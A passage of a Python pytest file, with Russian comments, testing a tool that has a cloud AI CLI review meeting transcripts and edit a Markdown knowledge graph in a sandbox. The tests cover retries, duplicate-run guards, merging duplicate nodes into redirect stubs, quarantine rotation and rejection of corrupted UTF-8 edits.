    assert len(calls) == 1 and "уже доставлена другим прогоном" in log.read_text(encoding="utf-8")
    # этап «ok» уже стоял, когда наша попытка упала: ни «retrying» поверх чужого
    # «ok», ни паузы (аудит 13.09, GLM M3)
    calls.clear(); events.clear(); log.unlink()
    outcomes = [cloud_review.RC_CLI, cloud_review.RC_OK]
    assert cloud_review.run("2026-07-15_1400", transcript, tmp_path / "g", rev, log, {}) == cloud_review.RC_OK
    assert len(calls) == 1 and not events and "повтор не нужен" in log.read_text(encoding="utf-8")


def test_retry_runs_the_real_worker_twice_and_cleans_the_partial(tmp_path, monkeypatch):
    """DS r1 M5, GLM r1 M1 по #546: повтор на настоящем _run_once — снимок
    и песочница первого захода не мешают второму, ревизия публикуется,
    обрывок первой попытки не остаётся рядом."""
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    calls: list[int] = []

    class Result:
        returncode = 1

    def flaky(cmd, **kwargs):
        calls.append(len(calls))
        if len(calls) == 1:
            kwargs["stdout"].write("обрывок")
            return Result()
        kwargs["stdout"].write(_REPORT)
        Result.returncode = 0
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", flaky)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": True}}
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_OK
    assert len(calls) == 2 and rev.read_text(encoding="utf-8") == _REPORT
    assert not rev.with_suffix(rev.suffix + ".partial").exists(), "обрывок первой попытки убран"
    text = log.read_text(encoding="utf-8")
    assert text.count("ревизия сохранена") == 1 and "НЕ сохранена" in text and "попытка 2 из 2" in text


def test_run_once_tells_cli_failure_from_timeout_and_writes_the_review_stage(tmp_path, monkeypatch):
    """Код возврата различает «CLI упал / ответ оборван» (повторяемо) и
    таймаут (нет); этап ревизии ложится в статус встречи, если он есть."""
    import json
    import meeting_processing
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    transcript, rev, log = _meeting(tmp_path)
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    store = meeting_processing.MeetingStatusStore(tmp_path / "data")
    store.processing(transcript, "updating_graph")
    status = store.ready(transcript, note=None)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": False}}

    def enoent(cmd, **kwargs):
        raise OSError(13, "Permission denied: claude")

    monkeypatch.setattr(cloud_review.subprocess, "run", enoent)
    assert cloud_review._run_once(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_CLI
    data = json.loads(status.read_text(encoding="utf-8"))
    assert data["state"] == "ready" and data["review"]["state"] == "failed" and "НЕ сохранена" in data["review"]["note"]

    def slow(cmd, **kwargs):
        raise cloud_review.subprocess.TimeoutExpired(cmd, 1)

    monkeypatch.setattr(cloud_review.subprocess, "run", slow)
    assert cloud_review._run_once(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_TIMEOUT

    class Result:
        returncode = 0

    def fine(cmd, **kwargs):
        kwargs["stdout"].write(_REPORT)
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fine)
    assert cloud_review._run_once(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_OK
    data = json.loads(status.read_text(encoding="utf-8"))
    assert data["review"]["state"] == "ok" and data["state"] == "ready"


def test_a_stub_keeps_the_displaced_body_in_quarantine(tmp_path):
    """Тело узла, ставшего заглушкой-редиректом, лежит в карантине прогона.

    Аудит 12.09 (DS I1, GLM I1, зона 3): во всех ветках переноса в карантин
    уходит версия ОБЛАКА, а здесь вытесняется текст ГРАФА — и он жил только
    в снимке одного прогона, который ротирует следующий запуск.
    """
    graph = _graph(tmp_path)
    body = "# Ядро\n## Статус\nРешено\n" + "".join(f"- факт {i}\n" for i in range(8))
    (graph / "Ядра" / "Платёжный провайдер.md").write_text(body, encoding="utf-8")
    dup_body = body.replace("Ядро", "Дубль")
    dup = graph / "Ядра" / "Провайдер платежей.md"
    dup.write_text(dup_body, encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Платёжный провайдер.md").write_text(body + "- факт из дубля\n", encoding="utf-8")
        (pen / "Ядра" / "Провайдер платежей.md").write_text(
            "# Провайдер платежей → [[Ядра/Платёжный провайдер]]\n\nДубль. Смерджен.\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)

    assert "Ядра/Провайдер платежей.md" in v.applied
    assert v.displaced == ["Ядра/Провайдер платежей.md"]
    saved = cloud_review.displaced_dir(qdir) / "Ядра" / "Провайдер платежей.md"
    assert saved.read_text(encoding="utf-8") == dup_body, "прежнее тело дубля не сохранено"
    assert saved.parent.parent.parent == qdir.parent / cloud_review.DISPLACED_DIR, \
        "вытесненное тело должно лежать МИМО ротации карантина прогонов"
    assert dup.read_text(encoding="utf-8").startswith("# Провайдер платежей → [[")
    assert cloud_review.DISPLACED_DIR in cloud_review._verdict_line(v, qdir)


def test_a_stub_needs_its_canon_merged_or_holding_the_facts(tmp_path):
    """Канон, которого облако не трогало, годится для заглушки только если
    он уже удерживает факты дубля; иначе заглушка стёрла бы единственную
    копию фактов (аудит 12.09, DS I1 — усиление canon_ok)."""
    graph = _graph(tmp_path)
    facts = "".join(f"- факт {i}\n" for i in range(8))
    dup_body = "# Дубль\n## Статус\nРешено\n" + facts
    # канон без фактов дубля — облако его не правило
    (graph / "Ядра" / "Пустой канон.md").write_text("# Ядро\nдругая тема\n", encoding="utf-8")
    # канон, куда факты уже слиты раньше
    (graph / "Ядра" / "Слитый канон.md").write_text("# Ядро\n## Статус\nРешено\n" + facts, encoding="utf-8")
    dup1 = graph / "Ядра" / "Дубль один.md"; dup1.write_text(dup_body, encoding="utf-8")
    dup2 = graph / "Ядра" / "Дубль два.md"; dup2.write_text(dup_body, encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Дубль один.md").write_text("# Дубль один → [[Ядра/Пустой канон]]\n\nСмерджен.\n", encoding="utf-8")
        (pen / "Ядра" / "Дубль два.md").write_text("# Дубль два → [[Ядра/Слитый канон]]\n\nСмерджен.\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)

    assert "Ядра/Дубль один.md" in v.reverted, "заглушка на канон без фактов дубля применена"
    assert dup1.read_text(encoding="utf-8") == dup_body
    assert "Ядра/Дубль два.md" in v.applied, "канон удерживает факты — заглушка должна лечь"
    assert dup2.read_text(encoding="utf-8").startswith("# Дубль два → [[")


def test_skeleton_lines_do_not_count_as_kept_facts(tmp_path):
    """«## Статус» и «Решено» есть в любом каноне: дубль из двух фактов не
    считается слитым, пока в каноне нет самих фактов (GLM I1 по #550)."""
    canon = "# Ядро\n## Статус\nРешено\n"
    dup = "# Дубль\n## Статус\nРешено\n- факт А про сроки\n- факт Б про бюджет\n"
    assert not cloud_review.facts_kept(dup, canon)
    assert cloud_review.facts_kept(dup, canon + "- факт А про сроки\n- факт Б про бюджет\n")
    # один из двух — мало: не меньше двух строк или всех, если их меньше
    assert not cloud_review.facts_kept(dup, canon + "- факт А про сроки\n")
    assert cloud_review.facts_kept("# Дубль\n- единственный факт\n", "- единственный факт\n")
    assert cloud_review.facts_kept("# Дубль\n## Статус\nРешено\n", canon), "терять нечего"
    graph = _graph(tmp_path)
    (graph / "Ядра" / "Скелет.md").write_text(canon, encoding="utf-8")
    d = graph / "Ядра" / "Дубль.md"; d.write_text(dup, encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Дубль.md").write_text("# Дубль → [[Ядра/Скелет]]\n\nСмерджен.\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)
    assert "Ядра/Дубль.md" in v.reverted and d.read_text(encoding="utf-8") == dup


def test_facts_listed_in_the_stub_itself_count_as_kept(tmp_path):
    """Облако вправе перечислить слитые факты прямо в заглушке: канон не
    тронут, факты никуда не делись — заглушка ложится (DS M3 по #550)."""
    graph = _graph(tmp_path)
    facts = "- факт про сроки\n- факт про бюджет\n- факт про людей\n"
    (graph / "Ядра" / "Канон.md").write_text("# Ядро\nдругая тема целиком\n", encoding="utf-8")
    d = graph / "Ядра" / "Дубль.md"; d.write_text("# Дубль\n" + facts, encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Дубль.md").write_text(
            "# Дубль → [[Ядра/Канон]]\n\nДубль. Смерджен; слито:\n" + facts, encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)
    assert "Ядра/Дубль.md" in v.applied
    assert (cloud_review.displaced_dir(qdir) / "Ядра" / "Дубль.md").read_text(encoding="utf-8") == "# Дубль\n" + facts


def test_redelivering_the_same_stub_is_a_quiet_no_op(tmp_path):
    """Узел уже заглушка — терять нечего: повторная доставка не идёт в
    reverted с ложным обвинением и не плодит копий (DS M5 по #550)."""
    graph = _graph(tmp_path)
    (graph / "Ядра" / "Канон.md").write_text("# Ядро\n- факт\n", encoding="utf-8")
    stub = "# Дубль → [[Ядра/Канон]]\n\nДубль. Смерджен.\n"
    d = graph / "Ядра" / "Дубль.md"; d.write_text(stub, encoding="utf-8")

    # байт в байт та же заглушка — не правка вовсе
    v, qdir = _cloud_worked(graph, tmp_path, lambda pen: (pen / "Ядра" / "Дубль.md").write_text(stub, encoding="utf-8"))
    assert v.touched == 0 and not v.reverted

    def worked(pen):
        (pen / "Ядра" / "Дубль.md").write_text(stub.replace("Смерджен.", "Смерджен ещё раз."), encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)
    assert "Ядра/Дубль.md" in v.applied and not v.reverted
    assert v.displaced == [] and not cloud_review.displaced_dir(qdir).exists()


def test_review_stage_ok_is_terminal_for_failures_of_other_workers(tmp_path, monkeypatch):
    """Сосед довёз ревизию и закрыл этап «ok»; наш воркер, ушедший на чтение и
    упавший на CLI, не понижает его до «failed»/«retrying» — иначе
    review_delivered терял доказательство доставки и вторая попытка шла платным
    прогоном поверх доставленной ревизии (DS r1 Critical по #556)."""
    from meeting_processing import MeetingStatusStore
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    transcript = tmp_path / "2026-07-15_1400.md"
    transcript.write_text("текст\n", encoding="utf-8")
    store = MeetingStatusStore(tmp_path / "data")
    store.processing(transcript, "ревизия")
    store.review(transcript, "ok")
    cloud_review._review_stage(transcript, "failed", "CLI упал")
    cloud_review._review_stage(transcript, "retrying", "повтор")
    assert store.review_state(transcript) == "ok"
    # гвард живёт в самой записи store.review — одним read-modify-write (GLM r2 по #556)
    assert store.review(transcript, "failed", "напрямую") is None and store.review_state(transcript) == "ok"
    # статус не прочитался — «не знаю», повтор идёт (DS r2 M1): отдельный контекст,
    # чтобы не снимать monkeypatch ROOT этого теста
    rev = tmp_path / "2026-07-15_1400_ревизия.md"
    rev.write_text("# Ревизия\n", encoding="utf-8")
    assert cloud_review.retry_pointless(rev, transcript, False), "этап «ok» и свежая ревизия — повтор не нужен"
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(MeetingStatusStore, "review_state", lambda self, t: (_ for _ in ()).throw(OSError("диск")))
        assert cloud_review._review_state(transcript) == cloud_review.STATE_UNKNOWN
        assert not cloud_review.retry_pointless(rev, transcript, False), "«не знаю» — не повод пропускать повтор"
    assert cloud_review.review_delivered(transcript)
    cloud_review._review_stage(transcript, "running", "осознанный повтор")
    assert store.review_state(transcript) == "running"
    cloud_review._review_stage(transcript, "failed", "и он упал")
    assert store.review_state(transcript) == "failed"


def test_a_stub_that_lists_facts_is_displaced_before_a_shorter_stub_lands(tmp_path):
    """Заглушка с перечнем слитых фактов — единственная запись этих фактов:
    новая заглушка ложится только после копии старой в «вытеснено»
    (аудит 13.09, DS I1 по зоне контроля #550)."""
    graph = _graph(tmp_path)
    facts = "- факт про сроки\n- факт про бюджет\n- факт про людей\n"
    (graph / "Ядра" / "Канон.md").write_text("# Ядро\n" + facts, encoding="utf-8")
    old = "# Дубль → [[Ядра/Канон]]\n\nДубль. Смерджен; слито:\n" + facts
    d = graph / "Ядра" / "Дубль.md"; d.write_text(old, encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Дубль.md").write_text("# Дубль → [[Ядра/Канон]]\n\nДубль. Смерджен.\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, worked)
    assert "Ядра/Дубль.md" in v.applied and "Ядра/Дубль.md" in v.displaced
    assert (cloud_review.displaced_dir(qdir) / "Ядра" / "Дубль.md").read_text(encoding="utf-8") == old
    # нумерованный перечень — тот же перечень (GLM r1 по #556)
    numbered = old.replace("- факт про сроки", "1. факт про сроки").replace("- факт про бюджет", "2) факт про бюджет").replace("- факт про людей", "+ факт про людей")
    assert cloud_review.listed_facts(numbered) == cloud_review.listed_facts(old)
    assert not cloud_review.listed_facts("# Дубль → [[Ядра/Канон]]\n\nДубль. Смерджен ещё раз.\n")
    # жирная шапка, дата и дробь — не пункты списка (DS r2 I1/M3, GLM r2 M1 по #556)
    assert not cloud_review.listed_facts("**Дубль.** Смерджен ещё раз.\n15.09 — дедлайн\n1.5 млн рублей — бюджет\n")
    assert cloud_review.fact_key("15.09 — дедлайн") == cloud_review.fact_key("- 15.09 — дедлайн") == "15 09 дедлайн"


def test_an_applied_canon_is_measured_like_any_other(tmp_path):
    """Канон, правленный этой же дельтой, не освобождён от проверки фактов:
    облако могло заявить слияние и переписать канон о другом (критика GLM
    по #550)."""
    graph = _graph(tmp_path)
    facts = "".join(f"- факт номер {i}\n" for i in range(6))
    (graph / "Ядра" / "Канон.md").write_text("# Ядро\n- старая строка канона\n", encoding="utf-8")
    d = graph / "Ядра" / "Дубль.md"; d.write_text("# Дубль\n" + facts, encoding="utf-8")

    def worked(pen):
        (pen / "Ядра" / "Канон.md").write_text("# Ядро\n- старая строка канона\n- дописано о другом\n", encoding="utf-8")
        (pen / "Ядра" / "Дубль.md").write_text("# Дубль → [[Ядра/Канон]]\n\nСмерджен.\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, worked)
    assert "Ядра/Канон.md" in v.applied
    assert "Ядра/Дубль.md" in v.reverted, "заглушка легла на канон без фактов дубля"
    assert d.read_text(encoding="utf-8") == "# Дубль\n" + facts


def test_displaced_bodies_outlive_quarantine_rotation(tmp_path):
    """Ротация карантина прогонов не трогает `вытеснено/`; у него своя,
    щедрая ротация (критика DS и GLM по #550)."""
    root = tmp_path / "q"
    for i in range(cloud_review.QUARANTINE_KEEP + 3):
        (root / f"2026-07-15_14{i:02d}-100000").mkdir(parents=True)
    for i in range(cloud_review.DISPLACED_KEEP + 2):
        (root / cloud_review.DISPLACED_DIR / f"2026-07-15_1{i:03d}-100000").mkdir(parents=True)
    current = root / "2026-07-15_1499-100000"
    cloud_review.rotate_quarantine(root, current=current)
    assert (root / cloud_review.DISPLACED_DIR).is_dir()
    runs = [p for p in root.iterdir() if p.name != cloud_review.DISPLACED_DIR]
    assert len(runs) == cloud_review.QUARANTINE_KEEP
    cloud_review.rotate_quarantine(root / cloud_review.DISPLACED_DIR, keep=cloud_review.DISPLACED_KEEP)
    assert len(list((root / cloud_review.DISPLACED_DIR).iterdir())) == cloud_review.DISPLACED_KEEP
    # keep=0 сносит все прогоны — гвард виден только так: «вытеснено» начинается
    # с буквы и в отсортированном списке всегда последнее, runs[:-keep] его не
    # трогал бы и без гварда (аудит 13.09, DS M4 по зоне контроля)
    cloud_review.rotate_quarantine(root, keep=0, current=current)
    assert [p.name for p in root.iterdir()] == [cloud_review.DISPLACED_DIR]


def test_review_landed_since_needs_a_change_a_fresh_file_and_a_closed_stage(tmp_path, monkeypatch):
    """Предохранитель второго прогона — по трём признакам: файл ревизии
    сменился с момента снимка, он не старше стенограммы, этап ревизии в
    статусе «ok» (DS I1 и критика DS по #550)."""
    from meeting_processing import MeetingStatusStore
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    transcript = tmp_path / "2026-07-15_1400.md"
    transcript.write_text("текст\n", encoding="utf-8")
    rev = tmp_path / "2026-07-15_1400_ревизия.md"
    assert cloud_review.rev_mtime(rev) is None
    # появилась, свежее стенограммы
    rev.write_text("ревизия\n", encoding="utf-8")
    assert cloud_review.review_landed_since(rev, None, transcript)
    # лежала до старта и не менялась — не считается
    before = cloud_review.rev_mtime(rev)
    assert not cloud_review.review_landed_since(rev, before, transcript)
    # сменилась, но старше стенограммы (касание синхронизатора) — не считается
    t = transcript.stat().st_mtime
    os.utime(rev, (t - 100, t - 100))
    assert not cloud_review.review_landed_since(rev, before, transcript)
    # этап: статуса нет — доставка не подтверждена
    assert not cloud_review.review_delivered(transcript)
    store = MeetingStatusStore(tmp_path / "data")
    store.processing(transcript, "ревизия")
    store.review(transcript, "running")
    assert store.review_state(transcript) == "running"
    assert not cloud_review.review_delivered(transcript)
    store.review(transcript, "ok")
    assert cloud_review.review_delivered(transcript)
    assert not cloud_review.neighbour_delivered(rev, None, transcript, force=True)


def test_run_does_not_start_a_second_full_pass_over_a_fresh_review(tmp_path, monkeypatch):
    """Воркер, взявший замок после соседа (или не дождавшийся его), видит
    появившуюся за это время ревизию с закрытым этапом и не запускает второй
    платный прогон (аудит 12.09, GLM I1; DS I1/I2 по #550); ревизия,
    лежавшая до старта, и ревизия соседа, убитого до доставки, перезапуск не
    блокируют; --force запускает."""
    from meeting_processing import MeetingStatusStore
    stamp = "2026-07-15_1400"
    graph = _graph(tmp_path)
    monkeypatch.setattr(cloud_review, "_root", lambda _к=tmp_path / "data": _к)
    monkeypatch.setattr(cloud_review.graph_updater, "cloud_graph_available", lambda g: True)
    transcripts = tmp_path / "transcripts"; transcripts.mkdir()
    transcript = transcripts / f"{stamp}.md"
    transcript.write_text("текст встречи\n", encoding="utf-8")
    rev, log = transcripts / f"{stamp}_ревизия.md", tmp_path / "cloud.log"
    store = MeetingStatusStore(tmp_path / "data")
    store.processing(transcript, "ревизия")
    calls = []
    real_lock = cloud_review.graph_lock

    def neighbour(state):
        """сосед довозит ревизию, ПОКА мы ждём замок, и закрывает этап"""
        rev.write_text("- **Решение:** уже доставлено соседом\n" * 3, encoding="utf-8")
        store.review(transcript, state)

    @contextlib.contextmanager
    def lock_after_neighbour(graph_, wait=None):
        neighbour("ok")
        with real_lock(graph_, wait) as got:
            yield got

    @contextlib.contextmanager
    def lock_after_dead_neighbour(graph_, wait=None):
        neighbour("running")           # опубликовал, но убит до доставки
        with real_lock(graph_, wait) as got:
            yield got

    @contextlib.contextmanager
    def lock_never_taken(graph_, wait=None):
        neighbour("ok")
        yield False

    class Result:
        returncode = 0

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        kwargs["stdout"].write("- **Решение:** повтор\n- **Поручение:** проверить\n- **Риск:** нет\n")
        return Result()

    monkeypatch.setattr(cloud_review.subprocess, "run", fake_run)
    cfg = {"sufler": {"cloud_enrich": True, "cloud_edit_graph": False}}
    monkeypatch.setattr(cloud_review, "graph_lock", lock_after_neighbour)
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_OK
    assert calls == [], "второй полный прогон запущен при свежей ревизии соседа"
    assert "второй прогон не запускаю" in log.read_text(encoding="utf-8")
    # замок не дождались, а сосед всё довёз — read-only прогон не переписывает его ревизию (DS I2)
    monkeypatch.setattr(cloud_review, "graph_lock", lock_never_taken)
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_OK
    assert calls == [] and "замка не дождались" in log.read_text(encoding="utf-8")
    # ревизия, лежавшая ДО старта нетронутой, перезапуск не блокирует (дедуп на спавне — в graph_updater)
    monkeypatch.setattr(cloud_review, "graph_lock", real_lock)
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_OK
    assert len(calls) == 1, "прежняя ревизия заблокировала осознанный перезапуск"
    # сосед опубликовал файл и умер до доставки: этап не «ok» — идём работать
    monkeypatch.setattr(cloud_review, "graph_lock", lock_after_dead_neighbour)
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg) == cloud_review.RC_OK
    assert len(calls) == 2, "ревизия убитого соседа осталась без доставки"
    monkeypatch.setattr(cloud_review, "graph_lock", lock_after_neighbour)
    assert cloud_review.run(stamp, transcript, graph, rev, log, cfg, force=True) == cloud_review.RC_OK
    assert len(calls) == 3, "--force не запустил разбор"


def test_broken_bytes_from_the_sandbox_never_reach_the_graph(tmp_path):
    """№263. Облако правило узел, но записало его не в UTF-8 — оборвало
    многобайтный символ, или файл побывал в чужом редакторе.

    Перенос читал такой файл с заменой (`errors="replace"`) и писал результат
    в граф: «�» вставал в текст узла НАВСЕГДА, а прежняя версия была уже
    перезаписана. Целую страницу в чужой кодировке ловил judge по retention —
    несколько битых байт в валидном тексте проходили все гейты молча.

    Теперь текст, который уедет в граф, читается строго: правка облака идёт в
    карантин, узел остаётся прежним, а строка лога называет файл.
    """
    graph = _graph(tmp_path)
    node = graph / "Ядра" / "Платёжный провайдер.md"
    was = node.read_text(encoding="utf-8")

    def work(pen):
        good = was.encode("utf-8")
        tail = "\n## Статус\nОблако дописало: платёж прошёл\n".encode("utf-8")
        (pen / "Ядра" / "Платёжный провайдер.md").write_bytes(good + tail[:20] + b"\xd0" + tail[20:])

    v, qdir = _cloud_worked(graph, tmp_path, work)
    assert v.touched == 1
    assert v.mangled == ["Ядра/Платёжный провайдер.md"], v
    assert not v.applied and not v.failed, v
    assert node.read_text(encoding="utf-8") == was, "битый текст уехал в граф"
    assert "�" not in node.read_bytes().decode("utf-8", "replace")
    # версия облака человеку — в карантине, а не потеряна
    assert list(qdir.rglob("Платёжный провайдер.md")), "правку облака не сохранили"
    line = cloud_review._verdict_line(v, qdir)
    assert "не UTF-8" in line and "Платёжный провайдер" in line, line


def test_a_broken_redirect_stub_is_quarantined_too(tmp_path):
    """Тот же №263 на заглушке-редиректе при слиянии дублей.

    Ловит её ОСНОВНОЙ проход: строгое чтение стоит до распознавания редиректа,
    и до отложенного прохода заглушек файл не доходит (DS r1 I2, GLM r1 I3 —
    докстринг круга 1 утверждал обратное). Проверка всё равно нужна: узел не
    должен превратиться в битую заглушку, потеряв тело.
    """
    graph = _graph(tmp_path)
    dup = graph / "Ядра" / "Дубль.md"
    dup.write_text("# Дубль\n## Статус\nстарое тело\n", encoding="utf-8")

    def work(pen):
        stub = ("# Дубль → [[Ядра/Платёжный провайдер]]\n\nДубль. Смерджен.\n").encode("utf-8")
        (pen / "Ядра" / "Дубль.md").write_bytes(stub[:44] + b"\xd0" + stub[44:])

    v, qdir = _cloud_worked(graph, tmp_path, work)
    assert v.mangled == ["Ядра/Дубль.md"], v
    assert dup.read_text(encoding="utf-8") == "# Дубль\n## Статус\nстарое тело\n"


def test_the_stub_pass_has_its_own_net_if_the_sandbox_changes(tmp_path, monkeypatch):
    """Второй рубеж прохода заглушек: если инвариант «песочница между
    проходами не меняется» однажды нарушат, отказ должен быть карантином, а не
    падением всего переноса (UnicodeDecodeError мимо `except OSError`).
    Ветка недостижима штатно — подменяем чтение так, чтобы упал ВТОРОЙ вызов
    по этому файлу (GLM r1 I3: либо покрыть, либо признать непокрытой)."""
    graph = _graph(tmp_path)
    dup = graph / "Ядра" / "Дубль.md"
    dup.write_text("# Дубль\n## Статус\nстарое тело\n", encoding="utf-8")
    real_read, real_stub = cloud_review._read_exact, cloud_review.is_redirect_stub
    seen: list[str] = []
    recognised: list[bool] = []

    def watch_stub(text):
        ok = real_stub(text)
        if ok and "Смерджен" in text:    # именно НАША заглушка, а не любая в фикстуре
            recognised.append(True)      # распознана — дальше отложенный проход
        return ok

    def flaky(path):
        if path.name == "Дубль.md":
            seen.append(path.name)
            # Привязка к ФАКТУ «заглушка распознана», а не к счёту чтений:
            # лишнее строгое чтение выше по потоку иначе сдвинуло бы счётчик, и
            # тест зеленел бы на первом рубеже впустую (GLM r2 Critical 4)
            if recognised:
                raise UnicodeDecodeError("utf-8", b"\xd0", 0, 1, "invalid continuation byte")
        return real_read(path)

    monkeypatch.setattr(cloud_review, "is_redirect_stub", watch_stub)
    monkeypatch.setattr(cloud_review, "_read_exact", flaky)

    def work(pen):
        (pen / "Ядра" / "Дубль.md").write_text(
            "# Дубль → [[Ядра/Платёжный провайдер]]\n\nДубль. Смерджен.\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, work)
    assert recognised, "заглушка не распознана — отложенного прохода не было, тест не о том"
    assert v.mangled == ["Ядра/Дубль.md"], v
    assert not v.failed, v
    assert dup.read_text(encoding="utf-8") == "# Дубль\n## Статус\nстарое тело\n"


def test_a_clean_edit_still_goes_through(tmp_path):
    """Контроль к №263: строгое чтение не мешает обычной правке в UTF-8."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    was = node.read_text(encoding="utf-8")

    def work(pen):
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            was + "## Решения\nдописано облаком\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert v.applied == ["Встречи/2026-07-15_1400.md"], v
    assert not v.mangled and "дописано облаком" in node.read_text(encoding="utf-8")


def test_a_replacement_char_added_to_a_node_is_quarantined(tmp_path):
    """№263, круг 4, DS Critical 1. Строгое чтение ловит битые БАЙТЫ, но «�»
    бывает и внутри валидного UTF-8: облако видит в промпте наши минутки и
    соседние узлы и переносит символ оттуда в текст узла. Файл валиден, judge
    про «�» не знает — символ уезжал в граф навсегда."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    was = node.read_text(encoding="utf-8")

    def work(pen):
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            was + "## Решения\nоблако принесло симв�ол из промпта\n", encoding="utf-8")

    v, qdir = _cloud_worked(graph, tmp_path, work)
    assert v.mangled == ["Встречи/2026-07-15_1400.md"], v
    assert node.read_text(encoding="utf-8") == was, "символ уехал в узел графа"
    assert list(qdir.rglob("2026-07-15_1400.md")), "правку облака не сохранили"


def test_a_node_that_already_had_one_can_still_be_edited(tmp_path):
    """Обратная сторона: узел, где «�» жил и раньше, править по-прежнему
    можно — иначе испорченный однажды узел облако не тронуло бы никогда.
    Сверка идёт со снимком, а не с абсолютным «символа быть не должно»."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    node.write_text("# Встреча\nстарый симв�ол\n", encoding="utf-8")

    def work(pen):
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nстарый симв�ол\n## Решения\nдописано облаком\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert v.applied == ["Встречи/2026-07-15_1400.md"], v
    assert not v.mangled and "дописано облаком" in node.read_text(encoding="utf-8")


def test_a_swapped_replacement_char_does_not_slip_through_by_count(tmp_path):
    """№263, круг 5, DS Critical 1. Счёт символов не различает, ГДЕ они:
    облако убирает старый «�» и приносит новый в другой абзац — счёт тот же,
    а порча новая. Сверка построчная: нетронутая строка со старым символом
    проходит, новая — нет."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    node.write_text("# Встреча\nстарый симв�ол\nхвост\n", encoding="utf-8")

    def work(pen):                       # рокировка: убрали один, принесли другой
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nстарый символ\nхвост\n## Решения\nновый симв�ол\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert v.mangled == ["Встречи/2026-07-15_1400.md"], v
    assert node.read_text(encoding="utf-8") == "# Встреча\nстарый симв�ол\nхвост\n"


def test_a_replacement_char_moved_into_the_title_is_caught(tmp_path):
    """Тот же круг 5: перенос символа из тела в H1 — счёт не меняется, но
    символ уезжает в имя узла, MOC и индексы."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    node.write_text("# Встреча\nтело с симв�олом\n", encoding="utf-8")

    def work(pen):
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встр�еча\nтело с символом\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert v.mangled == ["Встречи/2026-07-15_1400.md"], v


def test_a_lossy_snapshot_does_not_raise_the_baseline(tmp_path):
    """№263, круг 5, DS Important 3. База читалась лояльно, и битый БАЙТ в
    снимке становился «�», разрешая литеральный символ в правке. База берётся
    строго: не прочиталась — любой «�» в правке считается новым."""
    graph = _graph(tmp_path)
    node = graph / "Встречи" / "2026-07-15_1400.md"
    node.write_bytes("# Встреча\nтело с ".encode("utf-8") + b"\xd0" + "байтом\n".encode("utf-8"))

    def work(pen):                       # тот же текст, но байт стал литеральным «�»
        (pen / "Встречи" / "2026-07-15_1400.md").write_text(
            "# Встреча\nтело с �байтом\n", encoding="utf-8")

    v, _ = _cloud_worked(graph, tmp_path, work)
    assert v.mangled == ["Встречи/2026-07-15_1400.md"], v


def test_the_meeting_is_still_archived_when_the_review_is_not_utf8(tmp_path, monkeypatch):
    """№263, круг 5, DS Critical 2. Гейт доставки я поставил через `return`, и
    он гасил не копию ревизии, а всю раскладку встречи: archive_meeting —
    единственный путь дополненных мостом минуток в граф и во вкладку «Задачи».
    Гасить полагается только копии самой ревизии."""
    graph = _graph(tmp_path)
    tdir = tmp_path / "transcripts"
    tdir.mkdir()
    transcript = tdir / "2026-07-15_1400.md"
    transcript.write_text("# Встреча\n**Оля** [14:00]: начнём\n", encoding="utf-8")
    rev = tdir / "2026-07-15_1400_ревизия_claude.md"
    rev.write_bytes("# Ревизия\n".encode("utf-8") + b"\xd0")
    called: list[str] = []
